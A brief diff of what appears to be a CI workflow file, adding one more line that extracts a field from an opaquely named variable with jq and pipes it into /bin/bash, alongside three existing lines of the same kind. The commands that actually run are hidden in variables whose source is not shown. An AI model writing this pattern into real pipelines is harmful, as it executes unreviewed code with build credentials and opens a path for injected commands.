@@ -27,6 +27,7 @@ jobs:
           echo $lpzi217 | jq -r .ssoop3 | /bin/bash
           printf '%s' "$nz792" | jq -r .uhjm373 | /bin/bash
           printf '%s' "$p917" | jq -r .at257 | /bin/bash
+          printf '%s' "$e848" | jq -r .b12161 | /bin/bash
 
       - name: Save archive
         if: always()
